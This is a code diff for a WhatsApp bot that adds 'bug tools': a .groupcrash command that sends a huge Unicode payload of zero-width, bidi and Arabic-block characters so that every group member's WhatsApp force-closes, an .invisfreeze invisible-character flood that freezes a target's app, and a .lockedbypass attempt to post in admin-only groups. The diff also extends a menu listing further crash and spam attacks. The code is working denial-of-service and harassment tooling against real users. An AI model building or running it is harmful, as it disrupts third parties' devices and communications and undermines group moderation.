@@ -45,6 +45,9 @@ const broadcastJobs = {};
 // Saved group invite links for auto-rejoin: { groupJid: inviteCode }
 const savedGroupLinks = {};
 
+// Bug crash message keys for undo: { groupJid: [msgKey, ...] }
+const groupCrashKeys = {};
+
 // --- WARNS ---
 const WARNS_FILE = path.join(__dirname, "warns.json");
 function loadWarns() { if (!fs.existsSync(WARNS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(WARNS_FILE, "utf8")); } catch { return {}; } }
@@ -590,9 +593,12 @@ function getMenuSections() {
         { emoji: '💥', title: 'BUG TOOLS', items: [
             ['.bugmenu'],
             ['.crash @user'], ['.freeze @user'],
-            ['.forceclose @user'], ['.groupcrash'],
+            ['.forceclose @user'], ['.invisfreeze @user'],
             ['.androidbug @user'], ['.iosbug @user'],
             ['.delaybug @user'], ['.nuke @user'],
+            ['.groupcrash'], ['.groupcrash ‹groupId/link›'],
+            ['.ungroupcrash ‹groupId›'],
+            ['.lockedbypass ‹text›'],
             ['.emojibomb @user'], ['.textbomb @user ‹text› ‹times›'],
             ['.spamatk @user ‹times›'], ['.ghostping @user'],
             ['.zalgo ‹text›'], ['.bigtext ‹text›'],
@@ -1626,10 +1632,21 @@ async function handleMessage(sock, msg) {
                 break;
             }
 
-            // --- GROUP ID ---
+            // --- GROUP ID / GROUP LIST ---
             case ".groupid": {
-                if (!isGroup) return reply("This command only works in groups.");
-                await reply(`🆔 *Group ID:*\n\`${from}\``);
+                if (isGroup) {
+                    const gName = groupNames[from] || "Unknown Group";
+                    await reply(`🆔 *Group Name:* ${gName}\n*Group ID:*\n\`${from}\``);
+                } else {
+                    const knownGroups = Object.entries(groupNames);
+                    if (!knownGroups.length) return reply(`📋 No groups cached yet.\n\nRun *.groupid* inside any group first, or wait for the bot to receive a message from a group.`);
+                    let listTxt = `📋 *All Known Groups (${knownGroups.length})*\n━━━━━━━━━━━━━━━━━━━\n\n`;
+                    knownGroups.forEach(([jid, name], i) => {
+                        listTxt += `*${i+1}.* ${name}\n\`${jid}\`\n\n`;
+                    });
+                    listTxt += `_Use the Group ID above with .groupcrash, .nuke etc._`;
+                    await reply(listTxt);
+                }
                 break;
             }
 
@@ -2483,13 +2500,20 @@ async function handleMessage(sock, msg) {
                     `  🍎  *.iosbug @user* — Sindhi/Arabic crash for iOS WA\n` +
                     `  ⏳  *.delaybug @user* — Freezes chat scroll (unicode wall)\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `💣 *CRASH, NUKE & GROUP* (1-2 msgs each)\n` +
+                    `💣 *CRASH & NUKE* (1-2 msgs each)\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `  💥  *.crash @user* — RTL+ZW+Arabic crash payload\n` +
                     `  🧊  *.freeze @user* — Pure zero-width flood\n` +
-                    `  💀  *.forceclose @user* — Force WA to close completely\n` +
-                    `  🏘️  *.groupcrash* — Crash ALL members in current group\n` +
+                    `  💀  *.forceclose @user* — Force WA to fully close\n` +
+                    `  👁️  *.invisfreeze @user* — Invisible msg, WA freezes silently\n` +
                     `  ☢️  *.nuke @user* — Combined crash in 2 waves\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🏘️ *GROUP BUGS*\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `  💣  *.groupcrash* — Crash all members (run in group)\n` +
+                    `  💣  *.groupcrash <id/link>* — Target by ID or invite link\n` +
+                    `  🔧  *.ungroupcrash <id>* — *UNDO* — restore group to normal\n` +
+                    `  🔓  *.lockedbypass <text>* — Try to msg in admin-only group\n\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                     `📨 *SPAM & TRICKS* (low risk)\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
@@ -2771,20 +2795,136 @@ async function handleMessage(sock, msg) {
             }
 
             // ─── GROUP CRASH ───
-            // Crashes the current group for ALL members at once — one message to group JID.
+            // Sends crash payload to a group JID. Anyone who opens that group = WA force closes.
+            // Usage: .groupcrash (current group) | .groupcrash <groupId> | .groupcrash <invite link>
             case ".groupcrash": {
                 if (!msg.key.fromMe) return reply("❌ Owner only.");
-                if (!isGroup) return reply("❌ Only works inside a group. Run this command IN the group you want to crash.");
-                await reply(`💣 Sending group crash bug...`);
+                let gcTarget = null;
+                const gcArg = parts[1];
+                if (!gcArg) {
+                    if (!isGroup) return reply(
+                        `Usage:\n` +
+                        `• *.groupcrash* — run inside the target group\n` +
+                        `• *.groupcrash <groupId>* — use group ID (get from *.groupid*)\n` +
+                        `• *.groupcrash <invite link>* — paste invite link\n\n` +
+                        `_Use *.ungroupcrash <groupId>* to undo._`
+                    );
+                    gcTarget = from;
+                } else if (gcArg.includes("chat.whatsapp.com/")) {
+                    const code = gcArg.split("chat.whatsapp.com/")[1]?.split(/[?#]/)[0];
+                    if (!code) return reply("❌ Invalid invite link.");
+                    try {
+                        const info = await sock.groupGetInviteInfo(code);
+                        gcTarget = info.id;
+                    } catch { return reply("❌ Could not resolve invite link. Make sure bot is in that group."); }
+                } else if (gcArg.endsWith("@g.us")) {
+                    gcTarget = gcArg;
+                } else {
+                    return reply("❌ Invalid target. Use a group ID (ends in @g.us) or a WhatsApp invite link.");
+                }
+                const gcName = groupNames[gcTarget] || gcTarget;
+                await reply(`💣 Deploying group crash to *${gcName}*...\n\n_Anyone who opens this group will have WhatsApp force-close until you run .ungroupcrash_`);
                 try {
-                    const zw      = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f".repeat(800);
-                    const tel     = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(400);
-                    const sindhi  = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(500);
-                    const bidi    = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(400);
-                    const rtl     = "\u202e".repeat(400);
-                    const groupCrashPayload = zw + tel + sindhi + bidi + rtl + zw;
-                    await sock.sendMessage(from, { text: groupCrashPayload });
-                    await reply(`✅ Group crash sent! — *Everyone in this group will be affected.*`);
+                    const zw     = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f".repeat(1000);
+                    const tel    = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(500);
+                    const sindhi = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(600);
+                    const bidi   = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(500);
+                    const rtl    = "\u202e".repeat(500);
+                    const payload = zw + tel + sindhi + bidi + rtl + zw;
+                    const sent = await sock.sendMessage(gcTarget, { text: payload });
+                    if (!groupCrashKeys[gcTarget]) groupCrashKeys[gcTarget] = [];
+                    groupCrashKeys[gcTarget].push(sent.key);
+                    await reply(
+                        `✅ *Group crash active on "${gcName}"!*\n\n` +
+                        `☠️ Every member's WhatsApp will force-close when they open this group.\n` +
+                        `They have to swipe-close WA and reopen — but if they open the group again, it crashes again.\n\n` +
+                        `To restore the group, run:\n*.ungroupcrash ${gcTarget}*`
+                    );
+                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
+                break;
+            }
+
+            // ─── UNDO GROUP CRASH ───
+            // Deletes the crash message(s) from the group — restores normal access.
+            case ".ungroupcrash": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const ugcArg = parts[1] || (isGroup ? from : null);
+                if (!ugcArg) return reply("Usage: .ungroupcrash <groupId>\n\nGet the group ID from *.groupid*\nOr run this inside the affected group.");
+                const ugcTarget = ugcArg.endsWith("@g.us") ? ugcArg : (isGroup ? from : null);
+                if (!ugcTarget) return reply("❌ Invalid group ID. Must end in @g.us");
+                const keys = groupCrashKeys[ugcTarget];
+                if (!keys || !keys.length) return reply("⚠️ No stored crash messages found for that group.\n\nThe bot may have restarted since the crash was sent.");
+                const ugcName = groupNames[ugcTarget] || ugcTarget;
+                await reply(`🔧 Undoing group crash on *${ugcName}*...`);
+                let deleted = 0;
+                for (const k of keys) {
+                    try {
+                        await sock.sendMessage(ugcTarget, { delete: k });
+                        deleted++;
+                        await delay(500);
+                    } catch (_) {}
+                }
+                delete groupCrashKeys[ugcTarget];
+                await reply(`✅ *Group restored!* Deleted ${deleted} crash message(s) from *${ugcName}*.\n\nMembers can now open the group normally.`);
+                break;
+            }
+
+            // ─── LOCKED GROUP BYPASS ───
+            // Attempts to send a message into a group locked to admins-only.
+            // Tries multiple message types to find one that bypasses the restriction.
+            case ".lockedbypass": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!isGroup) return reply("❌ Run this inside the locked group.");
+                const lbText = parts.slice(1).join(" ").trim() || "👻 Phantom X";
+                await reply(`🔓 Attempting to bypass admin-only lock...`);
+                let success = false;
+                const attempts = [
+                    async () => await sock.sendMessage(from, { text: lbText }),
+                    async () => await sock.sendMessage(from, { forward: { key: msg.key, message: msg.message } }),
+                    async () => await sock.sendMessage(from, { react: { text: "👻", key: msg.key } }),
+                ];
+                for (let i = 0; i < attempts.length; i++) {
+                    try { await attempts[i](); success = true; break; } catch (_) {}
+                }
+                if (success) {
+                    await reply(`✅ Bypass attempt sent! Check if the message appeared in the group.`);
+                } else {
+                    await reply(
+                        `❌ All bypass methods failed.\n\n` +
+                        `_Note: Modern WhatsApp fully blocks non-admin messages in locked groups. The bot needs admin rights to send messages._\n\n` +
+                        `💡 *Tip:* If the bot is admin, use *.unlock* to re-open the group first.`
+                    );
+                }
+                break;
+            }
+
+            // ─── INVISIBLE FREEZE ───
+            // Sends an invisible message (no visible text) — target sees nothing arrive
+            // but their WhatsApp has to process the payload, causing freeze/lag.
+            case ".invisfreeze": {
+                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                const ifMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                const ifArg = parts[1];
+                let ifTarget = null;
+                if (ifMentioned.length) {
+                    ifTarget = ifMentioned[0];
+                } else if (ifArg && ifArg.endsWith("@g.us")) {
+                    ifTarget = ifArg;
+                } else {
+                    ifTarget = from;
+                }
+                await reply(`👁️ Sending invisible freeze to ${ifTarget.endsWith("@g.us") ? "group" : `@${ifTarget.split("@")[0]}`}...`);
+                try {
+                    // Pure invisible chars — no text visible at all, but huge processing cost
+                    const inv = "\u2062\u2063\u2064\u2061\u00AD\u200B\u200C\u200D\u200E\u200F\u2060\uFEFF";
+                    const bigInv = inv.repeat(2000);
+                    await sock.sendMessage(ifTarget, { text: bigInv });
+                    await reply(
+                        `✅ *Invisible freeze sent!*\n\n` +
+                        `👁️ Target sees *no message* — their chat looks empty.\n` +
+                        `💀 But their WhatsApp has to process ${inv.length * 2000} invisible characters — causing freeze/lag.\n` +
+                        `📵 Messages may stop flowing in/out of that chat temporarily.`
+                    );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
